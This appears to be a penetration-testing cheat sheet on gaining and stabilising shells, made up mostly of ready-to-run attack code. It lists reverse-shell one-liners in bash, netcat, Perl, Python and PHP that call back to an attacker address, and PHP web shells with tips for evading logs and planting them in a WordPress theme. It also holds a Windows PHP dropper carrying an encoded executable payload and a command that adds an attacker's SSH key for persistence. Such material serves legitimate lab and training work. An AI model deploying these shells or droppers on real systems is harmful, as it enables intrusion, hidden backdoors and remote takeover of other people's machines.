# Shells

## Great reverse shell generator

```
https://offsecnewbie.com/reverse_shell.php
```

{% hint style="success" %}
I like using port 443 as its generally open on firewalls for HTTPS traffic. Sometimes servers and firewalls block non standard ports like 4444 or 1337
{% endhint %}

{% hint style="info" %}
If connections drops or can not be established, try different ports 80,443,8080...
{% endhint %}

### Interactive Shell Test

Copy below into shell. If YES, then you have an interactive shell

```
[[ $- == *i* ]] &&  echo "YES" || echo "No"
```

terminal = tty = text input/output environment\
console = physical terminal\
shell = command line interpreter

## Why the F is my shell not returning?!

A firewall is likely blocking the port returning. What ports are open on the server? Use one of those ports.

## Escaping limited interpreters

#### Some payloads to overcome limited shells:

```
ssh user@$ip nc $localip 4444 -e /bin/sh
enter user's password

export TERM=linux
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
echo os.system('/bin/bash')
/bin/sh -i
exec "/bin/sh";
perl —e 'exec "/bin/sh";'

Related Shell Escape Sequences...

    vi-->	:!bash
    vi-->	:set shell=/bin/bash:shell
    awk-->	awk 'BEGIN {system("/bin/bash")}'
    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
    perl-->	perl -e 'exec "/bin/bash";'
```

go into `/bin/` and see what binaries are in there.

```
/bin/csh -i # worked for BSD
```

### From within tcpdump

```
echo $’id\n/bin/netcat $ip 443 -e /bin/bash’ > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -I eth- -w /dev/null -W 1 -G 1 -z /tmp/.tst -Z root
```

### From busybox

```
/bin/busybox telnetd -|/bin/sh -p9999
```

```
#If you need a more stable connection:
nohup bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
```

```
:!bash
:set shell=/bin/bash:shell
!bash
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
awk 'BEGIN {system("/bin/bash")}'
--interactive
echo "os.execute('/bin/sh')"
sudo nmap --script=exploit.nse
perl -e 'exec "/bin/bash";'
```

### Add public key to authorized keys:

```
echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authotized_keys
```

### Python TTY shells

```
https://github.com/infodox/python-pty-shells
```

```
on kali
edit tcp_pty_backconnect.py add kali ip and port and upload to target
python tcp_pty_shell_handler.py -b $kaliip:$port

on victim
chmod +x tcp_pty_backconnect.py
python tcp_pty_backconnect.py
```

Ippsec using tool

```
https://youtu.be/NMGsnPSm8iw
```

### Upgrading to fully interactive

```
# On victim
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-z
# On attacker
echo $TERM # note down
stty -a # note down rows and cols
stty raw -echo # this may be enough
fg
# On victim
reset
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```

{% hint style="danger" %}
Note: Netcat (`nc`) OpenBSD does not support `-e`
{% endhint %}

```
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
```

### Set PATH TERM and SHELL if missing:

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash
```

## PHP

### Webshell

{% hint style="info" %}
Web shells are hard to detect
{% endhint %}

This command will run system commands on the underlying system and return the complete output as a string

{% hint style="info" %}
[https://guide.offsecnewbie.com/web#php-ini](https://guide.offsecnewbie.com/web#php-ini)
{% endhint %}

Try to get this code on the server - possibly by contaminating a log file

{% hint style="success" %}
if a reverse shell is not returning back to you try a diff shell maybe python. run 'which python' to see if python is available
{% endhint %}

```
# Execute one command
<?php system("whoami"); ?>

# Take input from the url paramter. shell.php?cmd=whoami
#remember you might have to add index.php to url then you can do index.php?cmd=whoami
<?php system($_GET['cmd']); ?>

# The same but using passthru
<?php passthru($_GET['cmd']); ?>

# For shell_exec to output the result you need to echo it
<?php echo shell_exec("whoami");?>

# Exec() does not output the result without echo, and only output the last line. So not very useful!
<?php echo exec("whoami");?>

# Instead to this if you can. It will return the output as an array, and then print it all.
<?php exec("ls -la",$array); print_r($array); ?>

# preg_replace(). This is a cool trick
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

# Using backticks
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>

# Using backticks
<?php echo `whoami`; ?>

# download netcat and run it
<?php include (location of netcat),exec(reverse shell);?>
```

Then you can execute the commands like this

```
http://victim/index.php?cmd=pwd
```

Make the commands from above a bit more stealthy. Instead of passing the cmds through the url, which will be obvious in logs, pass them through other header-parameters. The use tamper data or burpsuite to insert the commands. Or just netcat or curl.

```
<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
<?php system($_SERVER['HTTP_USER_AGENT'])?>
```

```
<?php system($_SERVER['HTTP_USER_AGENT'])?>
```

add it to index page of a wordpress theme

```
http://$ip/webshell.php?cmd=id
```

You can use this to move from web shell to a command line shell

```
http://$ip/webshell.php?cmd=nc $kali $port -e /bin/sh
```

### A Great WebShell

```
https://github.com/flozz/p0wny-shell/blob/master/shell.php
```

### Windows Shell

```
<?php

header('Content-type: text/plain');
$ip   = "1.2.3.4"; //change this 
$port = "1234"; //change this
$payload = "7Vh5VFPntj9JDklIQgaZogY5aBSsiExVRNCEWQlCGQQVSQIJGMmAyQlDtRIaQGKMjXUoxZGWentbq1gpCChGgggVFWcoIFhpL7wwVb2ABT33oN6uDm+tt9b966233l7Z39779/32zvedZJ3z7RO1yQjgAAAAUUUQALgAvBEO8D+LBlWqcx0VqLK+4XIBw7vhEr9VooKylIoMpVAGpQnlcgUMpYohpVoOSeRQSHQcJFOIxB42NiT22xoxoQDAw+CAH1KaY/9dtw+g4cgYrAMAoQEd1ZPopwG1lai2v13dDI59s27M2/W/TX4zhwru9Qi9jem/4fTfbwKt54cB/mPZagIA5n+QlxCT5PnaOfm7BWH/cn37UJ7Xv7fxev+z/srjvOF5/7a59rccu7/wTD4enitmvtzFxhprXWZ0rHvn3Z0jVw8CQCEVZbgBwCIACBhqQ5A47ZBfeQSHAxSZYNa1EDYRIIDY6p7xKZBNRdrZFDKdsWhgWF7TTaW3gQTrZJAUYHCfCBjvctfh6OWAJ2clIOCA+My6kdq5XGeKqxuRW9f10cvkcqZAGaR32rvd+nNwlW5jf6ZCH0zX+c8X2V52wbV4xoBS/a2R+nP2XDqFfFHbPzabyoKHbB406JcRj/qVH/afPHd5GLfBPH+njrX2ngFeBChqqmU0N72r53JM4H57U07gevzjnkADXhlVj5kNEHeokIzlhdpJDK3wuc0tWtFJwiNpzWUvk7bJbXOjmyE7+CAcGXj4Vq/iFd4x8IC613I+0IoWFOh0qxjnLUgAYYnLcL3N+W/tCi8ggKXCq2vwNK6+8ilmiaHKSPZXdKrq1+0tVHkyV/tH1O2/FHtxVgHmccSpoZa5ZCO9O3V3P6aoKyn/n69K535eDrNc9UQfmDw6aqiuNFx0xctZ+zBD7SOT9oXWA5kvfUqcLxkjF2Ejy49W7jc/skP6dOM0oxFIfzI6qbehMItaYb8E3U/NzAtnH7cCnO7YlAUmKuOWukuwvn8B0cHa1a9nZJS8oNVsvJBkGTRyt5jjDJM5OVU87zRk+zQjcUPcewVDSbhr9dcG+q+rDd+1fVYJ1NEnHYcKkQnd7WdfGYoga/C6RF7vlEEEvdTgT6uwxAQM5c4xxk07Ap3yrfUBLREvDzdPdI0k39eF1nzQD+SR6BSxed1mCWHCRWByfej33WjX3vQFj66FVibo8bb1TkNmf0NoE/tguksTNnlYPLsfsANbaDUBNTmndixgsCKb9QmV4f2667Z1n8QbEprwIIfIpoh/HnqXyfJy/+SnobFax1wSy8tXWV30MTG1UlLVKPbBBUz29QEB33o2tiVytuBmpZzsp+JEW7yre76w1XOIxA4WcURWIQwOuRd0D1D3s1zYxr6yqp8beopn30tPIdEut1sTj+5gdlNSGHFs/cKD6fTGo1WV5MeBOdV5/xCHpy+WFvLO5ZX5saMyZrnN9mUzKht+IsbT54QYF7mX1j7rfnnJZkjm72BJuUb3LCKyMJiRh23fktIpRF2RHWmszSWNyGSlQ1HKwc9jW6ZX3xa693c8b1UvcpAvV84NanvJPmb9ws+1HrrKAphe9MaUCDyGUPxx+osUevG0W3D6vhun9AX2DJD+nXlua7tLnFX197wDTIqn/wcX/4nEG8RjGzen8LcYhNP3kYXtkBa28TMS2ga0FO+WoY7uMdRA9/r7drdA2udNc7d6U7C39NtH7QvGR1ecwsH0Cxi7JlYjhf3A3J76iz5+4dm9fUxwqLOKdtF1jW0Nj7ehsiLQ7f6P/CE+NgkmXbOieExi4Vkjm6Q7KEF+dpyRNQ12mktNSI9zwYjVlVfYovFdj2P14DHhZf0I7TB22IxZ+Uw95Lt+xWmPzW7zThCb2prMRywnBz4a5o+bplyAo0eTdI3vOtY0TY1DQMwx0jGv9r+T53zhnjqii4yjffa3TyjbRJaGHup48xmC1obViCFrVu/uWY2daHTSAFQQwLww7g8mYukFP063rq4AofErizmanyC1R8+UzLldkxmIz3bKsynaVbJz6E7ufD8OTCoI2fzMXOa67BZFA1iajQDmTnt50cverieja4yEOWV3R32THM9+1EDfyNElsyN5gVfa8xzm0CsKE/Wjg3hPR/A0WDUQ1CP2oiVzebW7RuG6FPYZzzUw+7wFMdg/0O1kx+tu6aTspFkMu0u3Py1OrdvsRwXVS3qIAQ/nE919fPTv6TusHqoD9P56vxfJ5uyaD8hLl1HbDxocoXjsRxCfouJkibeYUlQMOn+TP62rI6P6kHIewXmbxtl59BxMbt6Hn7c7NL7r0LfiF/FfkTFP1z7UF9gOjYqOP694ReKlG8uhCILZ4cLk2Louy9ylYDaB5GSpk03l7upb584gR0DH2adCBgMvutH29dq9626VPPCPGpciG6fpLvUOP4Cb6UC9VA9yA9fU1i+m5Vdd6SaOFYVjblJqhq/1FkzZ0bTaS9VxV1UmstZ8s3b8V7qhmOa+3Klw39p5h/cP/woRx4hVQfHLQV7ijTbFfRqy0T0jSeWhjwNrQeRDY9fqtJiPcbZ5xED4xAdnMnHep5cq7+h79RkGq7v6q+5Hztve262b260+c9h61a6Jpb+ElkPVa9Mnax7k4Qu+Hzk/tU+ALP6+Frut4L8wvwqXOIaVMZmDCsrKJwU91e/13gGfet8EPgZ8eoaeLvXH+JpXLR8vuALdasb5sXZVPKZ7Qv+8X0qYKPCNLid6Xn7s92DbPufW/GMMQ4ylT3YhU2RP3jZoIWsTJJQvLzOb4KmixmIXZAohtsI0xO4Ybd9QtpMFc0r9i+SkE/biRFTNo+XMzeaXFmx0MEZvV+T2DvOL4iVjg0hnqSF5DVuA58eyHQvO+yIH82Op3dkiTwGDvTOClHbC54L6/aVn9bhshq5Zntv6gbVv5YFxmGjU+bLlJv9Ht/Wbidvvhwa4DwswuF155mXl7pcsF8z2VUyv8Qa7QKpuTN//d9xDa73tLPNsyuCD449KMy4uvAOH80+H+nds0OGSlF+0yc4pyit0X80iynZmCc7YbKELGsKlRFreHr5RYkdi1u0hBDWHIM7eLlj7O/A8PXZlh5phiVzhtpMYTVzZ+f0sfdCTpO/riIG/POPpI3qonVcE636lNy2w/EBnz7Os+ry23dIVLWyxzf8pRDkrdsvZ7HMeDl9LthIXqftePPJpi25lABtDHg1VWK5Gu7vOW9fBDzRFw2WWAMuBo6Xbxym8Fsf9l0SV3AZC7kGCxsjFz95ZcgEdRSerKtHRePpiaQVquF8KOOiI58XEz3BCfD1nOFnSrTOcAFFE8sysXxJ05HiqTNSd5W57YvBJU+vSqKStAMKxP+gLmOaOafL3FLpwKjGAuGgDsmYPSSpJzUjbttTLx0MkvfwCQaQAf102P1acIVHBYmWwVKhSiVWpPit8M6GfEQRRbRVLpZA/lKaQy8VpsFhEIgHB0VFxMaHB6CxiYnKAKIk8I2fmNAtLZGIoXSiRqpVifxIAQRskNQ6bXylhtVD6njqPGYhXKL/rqrkOLUzNW6eChDBWJFo63lv7zXbbrPU+CfJMuSJHDmUVjshrxtUixYYPFGmLJAqGUgHXX5J1kRV7s9er6GEeJJ/5NdluqRLhkvfFhs+whf0Qzspoa7d/4ysE834sgNlJxMylgGAJxi3f8fkWWd9lBKEAXCpRiw2mgjLVBCeV6mvFowZg7+E17kdu5iyJaDKlSevypzyxoSRrrpkKhpHpC6T0xs6p6hr7rHmQrSbDdlnSXcpBN8IR2/AkTtmX7BqWzDgMlV6LC04oOjVYNw5GkAUg1c85oOWTkeHOYuDrYixI0eIWiyhhGxtT6sznm4PJmTa7bQqkvbn8lt044Oxj890l3VtssRWUIGuBliVcQf8yrb1NgGMu2Ts7m1+pyXliaZ9LxRQtm2YQBCFaq43F+t24sKJPh3dN9lDjGTDp6rVms5OEGkPDxnZSs0vwmZaTrWvuOdW/HJZuiNaCxbjdTU9IvkHkjVRv4xE7znX3qLvvTq+n0pMLIEffpLXVV/wE5yHZO9wEuojBm3BeUBicsdBXS/HLFdxyv5694BRrrVVM8LYbH7rvDb7D3V1tE3Z31dG9S9YGhPlf71g+/h6peY/K573Q0EjfHutRkrnZdrPR/Nx4c/6NgpjgXPn+1AM3lPabaJuLtO717TkhbaVJpCLp8vFPQyE+OdkdwGws2WN78WNC/ADMUS/EtRyKKUmvPSrFTW8nKVllpyRlvrxNcGGpDHW/utgxRlWpM47cXIbzWK0KjyeI7vpG3cXBHx48fioKdSsvNt180JeNugNPp/G9dHiw7Mp6FuEdP1wYWuhUTFJ6libBKCsrMZbB142LSypxWdAyEdoHZLmsqrQC3GieGkZHQBZOFhLxmeacNRRfn8UEEw6BSDv3/svZRg7AwtklaCK5QBKOUrB3DzG/k8Ut9RRigqUKlRh83jsdIZSLpGKlWAiLY5SKNOT6cPV+Li1EbA+LJbAkTSiNE6dV9/A4cQ6hcjulfbVVZmIu3Z8SvqJHrqhZmC2hymXipRuE7sLUjurA6kgukydUsZRzlDbPb3z4MkohUksLnEO4yPiQlX1EHLwaVmetlacrDvUkqyB8Trbk/U/GZeIu3qVseyKcIN/K//lV9XLR58ezHMIkUjMLq1wxES9VCU9I1a9ivB/eOJMPB9CqZDWODTaJwqSwqjjyyDdWw2ujU7fND/+iq/qlby6fnxEumy//OkMb1dGgomZhxRib9B07XlTLBsVuKr4wiwHnZdFqb8z+Yb8f4VCq1ZK2R6c9qAs9/eAfRmYn00uZBIXESp6YMtAnXQhg0uen5zzvTe7PIcjEsrSsvNUElSRD3unww3WhNDs9CypOP1sp7Rr/W1NiHDeOk7mQa1cfVG5zpy246x2pU531eShXlba8dkLYsCNVIhd5qwJmJTukgw4dGVsV2Z2b6lPztu86tVUuxePD25Uq6SZi/srizBWcgzGhPAwR7Z/5GkFLc2z7TOdM9if/6ADM0mFNQ9IQPpl+2JO8ec78bsd7GDAgT36LepLCyVqCAyCC8s4KkM6lZ3Xi13kctDIuZ+JalYDn9jaPD2UllObdJQzj4yLyVC+4QOAk8BANRN5eIRWen8JWOAwNyVyYJg+l2yTdEN3a6crkeIi3FnRAPUXKspM4Vcwc15YJHi5VrTULwkp3OmpyJMFZo5iKwRP4ecGx8X40QcYB5gm2KyxVHaI8DYCMi7Yyxi7NBQoYbzpVNoC87VkFDfaVHMDQYOEjSKL2BmKhG1/LHnxYCSEc06Um6OdpR6YZXcrhCzNt/O8QhgnTpRpVW78NVf1erdoBnNLmSh8RzdaOITCsu/p7fusfAjXE/dPkH4ppr2ALXgLPEER7G2OwW6Z9OZ1N24MNQhe1Vj0xmIY+MYx6rLYR1BG010DtIJjzC+bWIA+FU3QTtTvRle4hhLsPBGByJjRrAPVTPWEPH0y/MkC8YqIXNy2e1FgGMGMzuVYlHT92GhoAIwDoCdYmOEDPBw2FnoAJ3euzGO01InJYhPqH0HJEE9yte5EY8fRMAnJ45sUESifocFozaHmMHM5FAf0ZKTqi1cYQpH7mVUFM/DYwLhG5b9h9Ar16GihfI3DLT4qJj5kBkwzHZ4iG+rVoUqKX6auNa2O2YeKQ20JDCFuzDVjZpP5VO6QZ9ItFEMucDQ2ghgNMf1Nkgm224TYiMJv+469Iu2UkpZGCljZxAC2qdoI39ncSYeIA/y//C6S0HQBE7X/EvkBjzZ+wSjQu+RNWj8bG9v++bjOK30O1H9XnqGJvAwD99pu5eW8t+631fGsjQ2PXh/J8vD1CeDxApspOU8LoMU4KJMZ581H0jRsdHPmWAfAUQhFPkqoUKvO4ABAuhmeeT1yRSClWqQBgg+T10QzFYPRo91vMlUoVab9FYUqxGP3m0FzJ6+TXiQBfokhF//zoHVuRlimG0dozN+f/O7/5vwA=";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);
			            
?>
```

{% hint style="info" %}
maybe URL encode it
{% endhint %}

Commands to try in a webshell to find out a bit more about system through webshell to help you get a command line shell

## Kali shells

```
/usr/share/webshells/
```

Copy `php-reverse-shell.php` to working directory

```
cp /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.php
```

### Best PHP reverse shell:

```
<?php
echo 'running shell';
$ip='YOUR_IP';
$port='YOUR_PORT';
$reverse_shells = array(
    '/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1',
    '0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; /bin/sh <&196 >&196 2>&196',
    '/usr/bin/nc '.$ip.' '.$port.' -e /bin/bash',
    'nc.exe -nv '.$ip.' '.$port.' -e cmd.exe',
    "/usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"".$ip.":".$port."\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    'rm -f /tmp/p; mknod /tmp/p p && telnet '.$ip.' '.$port.' 0/tmp/p',
    'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
);
foreach ($reverse_shells as $reverse_shell) {
   try {echo system($reverse_shell);} catch (Exception $e) {echo $e;}
   try {shell_exec($reverse_shell);} catch (Exception $e) {echo $e;}
   try {exec($reverse_shell);} catch (Exception $e) {echo $e;}
}
system('id');
?>
```

### MIME Types

GIF89;

{% hint style="success" %}
If a shell session closes quickly after it has been established, try to create a new shell session by executing one of the following commands on the initial shell. This will create a nested session!
{% endhint %}

```
bash
/bin/sh
/bin/sh -i
```

### Using netcat

```
nc <attacker_ip> <port> -e /bin/bash
```

### Using bash and TCP sockets

```
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
```

### Using sh and TCP sockets

```
0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196
```

### Using telnet

```
telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
```

### PHP and sh

```
php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### weevely

```
https://www.acunetix.com/blog/articles/web-shells-action-introduction-web-shells-part-4/
```

```
--weevely.py command password output--
./weevely.py generate abcd123 shell.php
upload to victim then execute
./weevely.py http://$ip/shell.php abcd123

Then if you want reverse shell, run this on victim after running listener on kali
backdoor_reversetcp $kaliip $port
```

### Perl and sh

```
perl -e 'use Socket;$i="<attacker_ip>";$p=<port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Perl forking:

```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ip:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Reverse shell with python script:

```
#!/usr/bin/python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP",port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Go reverse shell

{% hint style="info" %}
Communicates over DNS
{% endhint %}

```
https://github.com/sysdream/chashell
```

## Discover shell environment

| Command                | Output                                          |
| ---------------------- | ----------------------------------------------- |
| php -v                 | PHP version                                     |
| Python -V              | Python version                                  |
| Perl -v                | Perl version                                    |
| ls /usr/bin            | Directory contents /usr/bin                     |
| uname -a               | System information Linux                        |
| dir C:\”Program Files” | Directory contents Windows Program Files folder |
| systeminfo             | System information Windows                      |
| id                     | Current user Linux                              |
| whoami                 | Current user Windows                            |
| pwd                    | Print working directory                         |

## Reading

```
https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/
```
